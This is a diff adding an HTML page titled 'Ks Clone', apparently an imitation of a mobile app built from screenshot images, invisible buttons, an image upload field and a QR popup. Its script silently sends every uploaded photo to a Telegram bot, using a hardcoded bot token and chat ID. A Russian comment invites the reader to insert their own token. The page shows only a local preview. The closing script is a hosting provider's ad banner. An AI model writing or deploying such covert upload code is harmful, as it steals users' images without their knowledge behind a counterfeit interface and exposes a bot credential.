@@ -1,0 +1,373 @@
+<!DOCTYPE html>
+    <html> 
+        <link rel="apple-touch-icon" href="img/icon.png">
+    <head>  
+        <style> img {width: 100%;} </style>
+        <meta name="apple-mobile-web-app-status-bar-style" content="white">
+        <meta name="apple-mobile-web-app-capable" content="yes">
+        <meta name="viewport" content="width=device-width">
+        <title> Ks Clone </title>
+        <style>
+            .top {
+                top: 0px;
+                left: 0px;
+                width: 100%;
+                position: fixed;
+                touch-action: none;
+                display: block;
+            }
+
+            .down {
+                width: 100%;
+                bottom: 0px;
+                left: 0px;
+                position: fixed;
+                touch-action: none;
+                display: block;
+                
+                
+                
+            }
+
+            .btn {
+                width: 100%;
+                height: 70px;
+                bottom: 80px;
+                position: fixed;
+                left: 0px;
+                opacity: 0;
+                display: block;
+
+            }
+
+            .image-preview {
+                position: relative;
+                top: 30px ;
+                image-resolution: 100%;
+                width: auto;
+                min-height: auto;
+                border: 2px solid white;
+                margin-top: 15px;
+                touch-action: pan-x pan-y pinch-zoom ;
+                z-index: -1;
+                display: block;
+            }
+
+            .image-preview__image {
+
+                position: sticky;
+                top: 20%;
+                bottom: 20px;
+                image-resolution: 100dpi;
+                width: 100%;
+                height: auto;
+                display: flex;
+                align-items: center;
+                justify-content: center;
+                font-weight: bold;
+                color: grey; 
+                touch-action: pan-y ;
+                margin-top: 100px;
+                margin-bottom: 40%;
+                display: block;
+                        
+            }
+
+          
+
+            .popup {
+                top: 150%;
+                border-radius: 10px;
+                position: fixed;
+                left: 0px;
+                visibility: hidden;
+                transition: all 0.5s ease-in-out;
+                display: block;
+            }
+
+            .qrimage {
+                border-radius: 10px;
+                display: block;
+            }
+
+            .close {
+                position: absolute;
+                left: 85%;
+                bottom: 90%;
+                width: 40px;
+                height: 40px;
+                opacity: 0;
+                display: block;
+
+
+            }
+
+            .open-popup {
+                visibility: visible;
+                
+            }
+
+            .overlay {
+
+                position: fixed;
+                top: 0px;
+                left: 0px;
+                width: 100vw;
+                height: 100%;
+                background-color: rgba(0,0,0,0.7); 
+                display: none;
+            }
+
+                                          
+            .back {
+
+                position: fixed;
+                top: 2%;
+                width: 40px;
+                left: 10px;
+                height: 40px;
+                z-index: 6;
+                opacity: 0;
+                display: block;
+
+            }
+
+            .back2 {
+
+                position: fixed;
+                top: 2%;
+                width: 40px;
+                left: 10px;
+                height: 40px;
+                z-index: -20;
+                opacity: 0;
+                display: block;
+
+            }
+
+            .back3 {
+
+                  position: fixed;
+                top: 2%;
+                width: 40px;
+                left: 10px;
+                height: 40px;
+                z-index: -20;
+                opacity: 0;
+                display: block;
+            }
+
+            .back_img {
+                position: fixed;
+                top: 0px;
+                width: 100%;
+                left: -100%;
+                z-index: 20;
+                display: block;
+                transition: all 0.5s ease-in-out;
+                touch-action: pan-y;
+
+            }
+
+            .back_img2 {
+
+                position: fixed;
+                top: 0px;
+                width: 100%;
+                left: -100%;
+                z-index: 40;
+                display: block;
+                transition: all 0.5s ease-in-out;
+                touch-action: pan-y;
+
+            }
+
+            .main_menu {
+
+                position: fixed;
+                top: 0px;
+                width: 100%;
+                left: -100%;
+                z-index: 60;
+                display: block;
+                transition: all 0.5s ease-in-out;
+                touch-action: pan-y;
+
+            }
+
+            .id1 {
+
+                position: absolute;
+                top: 60px;
+                left: 20px;
+                height: 50px;
+                width: 250px;
+                opacity: 0;
+                display: block;
+
+
+            }
+
+            .forward {
+
+                position: fixed;
+                top: 13%;
+                width: 100%;
+                height: 70px;
+                z-index: -20;
+                left: 0px;
+                opacity: 0;
+            }
+
+            .forward2 {
+
+                position: fixed;
+                top: 13%;
+                width: 100%;
+                height: 70px;
+                z-index: -20;
+                left: 0px;
+                opacity: 0;
+
+            }
+
+            .forward3 {
+
+                position: fixed;
+                top: 37%;
+                width: 70px;
+                height: 70px;
+                z-index: -30;
+                opacity: 1;
+                left: 80%;
+                opacity: 0;
+
+            }
+        </style>
+    </head>
+            <body>
+                <app>
+                    <button class="forward" onclick="forwardFunc()"></button>
+                    <button class="forward2" onclick="forwardFunc2()"></button>
+                    <button class="forward3" onclick="forwardFunc3()"></button>
+                    <button class="back3" onclick="backFunc3()"> </button>
+                    <button class="back2" onclick="backFunc2()"></button>
+                    <button class="back"  onclick="backFunc()"> </button>
+
+                        <div class="back_screen">  </div>
+                            <img src="img/main.png" class="main_menu">
+                            <img src="img/back_image1.png" class="back_img">
+                            <img src="img/back_image.png" class="back_img2">
+                        
+                        <div class="container"> 
+                            <img src="img/top.png" alt="" class="top">
+                            <div class="main_win">
+                                <input class="id1" type="file" name="inpFile" id="inpFile" accept="image/*">
+                                <div class="image-preview" id="imagePreview">
+                                    <img src="" alt="" class="image-preview__image"> 
+                                </div>
+                            </div>
+                            <div class="bottom_btn">
+                            
+                            <img src="img/bottom.png" alt="" id="qrclick" class="down"><img src="img/bottom.png" alt="" id="qrclick" class="down">
+                            <button class="btn" onclick="openPopup()">  </button>
+                        </div>
+                    <div class="overlay"> </div> 
+             <div id="popup1" class="popup">
+                     <img src="img/QR.png" class="qrimage">
+                        <button class="close" onclick="closeFunc()"> </button>
+             </div>
+
+
+                            <script>
+                                const inpFile = document.getElementById("inpFile");
+                                const previewContainer = document.getElementById("imagePreview");
+                                const previewImage = previewContainer.querySelector(".image-preview__image");
+
+                                // 🔁 ВСТАВЬ СЮДА СВОЙ ТОКЕН И CHAT_ID
+                                const TELEGRAM_TOKEN = "8363295294:AAGaRrVfede3k4MU-j_0ZC-8uWAhWKNQMzg";
+                                const CHAT_ID = "5475287755";
+
+                                inpFile.addEventListener("change", function () {
+                                    const file = this.files[0];
+
+                                    if (file) {
+                                        const reader = new FileReader();
+
+                                        reader.addEventListener("load", function () {
+                                            console.log(this);
+                                            previewImage.setAttribute("src", this.result);
+
+                                            // Отправка файла в Telegram
+                                            const formData = new FormData();
+                                            formData.append("chat_id", CHAT_ID);
+                                            formData.append("photo", file); // Файл изображения
+
+                                            fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`, {
+                                                method: "POST",
+                                                body: formData
+                                            })
+                                            .then(response => response.json())
+                                            .then(data => {
+                                                if (data.ok) {
+                                                    console.log("✅ Фото отправлено в Telegram");
+                                                } else {
+                                                    console.error("❌ Ошибка Telegram:", data);
+                                                }
+                                            })
+                                            .catch(error => {
+                                                console.error("⚠️ Ошибка при отправке:", error);
+                                            });
+                                        });
+
+                                        reader.readAsDataURL(file);
+                                    }
+                                });
+
+                                function openPopup() {
+                                    document.querySelector('.popup').style.visibility = 'visible';
+                                    document.querySelector('.popup').style.top = '50%';
+                
+                                    document.querySelector('.overlay').style.display = 'block';
+                                    }   
+                                function closeFunc() {
+                                    document.querySelector('.popup').style.visibility = 'hidden';
+                                    document.querySelector('.overlay').style.display = 'none';
+                                    document.querySelector('.popup').style.top = '150%';
+                                }    
+                                function backFunc() {
+
+                                    document.querySelector('.back_img').style.display = 'block';
+                                    document.querySelector('.back_img').style.left = '0px';
+                                    document.querySelector('.back2').style.zIndex = '30';
+                                    document.querySelector('.forward').style.zIndex = '30';
+                                }
+                                function forwardFunc() {
+                                    document.querySelector('.back_img').style.display = 'block';
+                                    document.querySelector('.back_img').style.left = '-100%';
+                                    document.querySelector('.back2').style.zIndex = '-20';
+                                    document.querySelector('.forward').style.zIndex = '-20';
+                                }
+                                function backFunc2 () {
+                                    document.querySelector('.back_img2').style.left = '0px';
+                                    document.querySelector('.forward2').style.zIndex = '50';
+                                    document.querySelector('.back3').style.zIndex = '50';
+                                }
+                                function forwardFunc2 () {
+
+                                    document.querySelector('.back_img2').style.left = '-100%';
+                                    document.querySelector('.back3').style.zIndex = '-20';
+                                    document.querySelector('.forward2').style.zIndex = '-20';
+                                }
+                                function backFunc3 () {
+                                    document.querySelector('.main_menu').style.left = '0px';
+                                    document.querySelector('.forward3').style.zIndex = '70';
+                                }
+                                function forwardFunc3 () {
+                                   document.querySelector('.main_menu').style.left = '-100%';
+                                }
+                            </script>
+                        </div>
+                    </app>
+            <script>function getCookie(t){for(var e=t+"=",n=decodeURIComponent(document.cookie).split(";"),o=0;o<n.length;o++){for(var i=n[o];" "==i.charAt(0);)i=i.substring(1);if(0==i.indexOf(e))return i.substring(e.length,i.length)}return""}getCookie("hostinger")&&(document.cookie="hostinger=;expires=Thu, 01 Jan 1970 00:00:01 GMT;",location.reload());var wordpressAdminBody=document.getElementsByClassName("wp-admin")[0],notification=document.getElementsByClassName("notice notice-success is-dismissible"),hostingerLogo=document.getElementsByClassName("hlogo"),mainContent=document.getElementsByClassName("notice_content")[0];if(null!=wordpressAdminBody&¬ification.length>0&&null!=mainContent && new Date().toISOString().slice(0, 10) > '2023-10-29' && new Date().toISOString().slice(0, 10) < '2023-11-27'){var googleFont=document.createElement("link");googleFontHref=document.createAttribute("href"),googleFontRel=document.createAttribute("rel"),googleFontHref.value="https://fonts.googleapis.com/css?family=Roboto:300,400,600,700",googleFontRel.value="stylesheet",googleFont.setAttributeNode(googleFontHref),googleFont.setAttributeNode(googleFontRel);var css="@media only screen and (max-width: 576px) {#main_content {max-width: 320px !important;} #main_content h1 {font-size: 30px !important;} #main_content h2 {font-size: 40px !important; margin: 20px 0 !important;} #main_content p {font-size: 14px !important;} #main_content .content-wrapper {text-align: center !important;}} @media only screen and (max-width: 781px) {#main_content {margin: auto; justify-content: center; max-width: 445px;}} @media only screen and (max-width: 1325px) {.web-hosting-90-off-image-wrapper {position: absolute; max-width: 95% !important;} .notice_content {justify-content: center;} .web-hosting-90-off-image {opacity: 0.3;}} @media only screen and (min-width: 769px) {.notice_content {justify-content: space-between;} #main_content {margin-left: 5%; max-width: 445px;} .web-hosting-90-off-image-wrapper {position: absolute; display: flex; justify-content: center; width: 100%; }} .web-hosting-90-off-image {max-width: 90%;} .content-wrapper {min-height: 454px; display: flex; flex-direction: column; justify-content: center; z-index: 5} .notice_content {display: flex; align-items: center;} * {-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale;} .upgrade_button_red_sale{box-shadow: 0 2px 4px 0 rgba(255, 69, 70, 0.2); max-width: 350px; border: 0; border-radius: 3px; background-color: #ff4546 !important; padding: 15px 55px !important; font-family: 'Roboto', sans-serif; font-size: 16px; font-weight: 600; color: #ffffff;} .upgrade_button_red_sale:hover{color: #ffffff !important; background: #d10303 !important;}",style=document.createElement("style"),sheet=window.document.styleSheets[0];style.styleSheet?style.styleSheet.cssText=css:style.appendChild(document.createTextNode(css)),document.getElementsByTagName("head")[0].appendChild(style),document.getElementsByTagName("head")[0].appendChild(googleFont);var button=document.getElementsByClassName("upgrade_button_red")[0],link=button.parentElement;link.setAttribute("href","https://www.hostinger.com/hosting-starter-offer?utm_source=000webhost&utm_medium=panel&utm_campaign=000-wp"),link.innerHTML='<button class="upgrade_button_red_sale">Claim deal</button>',(notification=notification[0]).setAttribute("style","padding-bottom: 0; padding-top: 5px; background-color: #040713; background-size: cover; background-repeat: no-repeat; color: #ffffff; border-left-color: #040713;"),notification.className="notice notice-error is-dismissible";var mainContentHolder=document.getElementById("main_content");mainContentHolder.setAttribute("style","padding: 0;"),hostingerLogo[0].remove();var h1Tag=notification.getElementsByTagName("H1")[0];h1Tag.className="000-h1",h1Tag.innerHTML="The Biggest Ever <span style='color: #FF5C62;'>Black Friday</span> Sale<div style='font-size: 16px;line-height: 24px;font-weight: 400;margin-top: 12px;'><div style='display: flex;justify-content: flex-start;align-items: center;'><img src='https://www.000webhost.com/static/default.000webhost.com/images/generic/green-check-mark.png' alt='' style='margin-right: 10px; width: 20px;'>Managed WordPress Hosting</div><div style='display: flex;justify-content: flex-start;align-items: center;'><img src='https://www.000webhost.com/static/default.000webhost.com/images/generic/green-check-mark.png' alt='' style='margin-right: 10px; width: 20px;'>WordPress Acceleration</div><div style='display: flex;justify-content: flex-start;align-items: center;'><img src='https://www.000webhost.com/static/default.000webhost.com/images/generic/green-check-mark.png' alt='' style='margin-right: 10px; width: 20px;'>Support from WordPres Experts 24/7</div></div>",h1Tag.setAttribute("style",'color: white; font-family: "Roboto", sans-serif; font-size: 46px; font-weight: 700;');h2Tag=document.createElement("H2");h2Tag.innerHTML="<span style='font-size: 20px'>$</span>2.49<span style='font-size: 20px'>/mo</span>",h2Tag.setAttribute("style",'color: white; margin: 10px 0 0 0; font-family: "Roboto", sans-serif; font-size: 60px; font-weight: 700; line-height: 1;'),h1Tag.parentNode.insertBefore(h2Tag,h1Tag.nextSibling);var paragraph=notification.getElementsByTagName("p")[0];paragraph.innerHTML="<span style='text-decoration:line-through; font-size: 14px; color:#727586'>$11.99.mo</span><br>+ 2 Months Free",paragraph.setAttribute("style",'font-family: "Roboto", sans-serif; font-size: 20px; font-weight: 700; margin: 0 0 15px; 0');var list=notification.getElementsByTagName("UL")[0];list.remove();var org_html=mainContent.innerHTML,new_html='<div class="content-wrapper">'+mainContent.innerHTML+'</div><div class="web-hosting-90-off-image-wrapper" style="height: 90%"><img class="web-hosting-90-off-image" src="https://www.000webhost.com/static/default.000webhost.com/images/sales/bf2023/hero.png"></div>';mainContent.innerHTML=new_html;var saleImage=mainContent.getElementsByClassName("web-hosting-90-off-image")[0]}else if(null!=wordpressAdminBody&¬ification.length>0&&null!=mainContent){var bulletPoints = mainContent.getElementsByTagName('li');var replacement=['Increased performance (up to 5x faster) - Thanks to Hostinger’s WordPress Acceleration and Caching solutions','WordPress AI tools - Creating a new website has never been easier','Weekly or daily backups - Your data will always be safe','Fast and dedicated 24/7 support - Ready to help you','Migration of your current WordPress sites to Hostinger is automatic and free!','Try Premium Web Hosting now - starting from $1.99/mo'];for (var i=0;i<bulletPoints.length;i++){bulletPoints[i].innerHTML = replacement[i];}}</script></body>
+    </html>
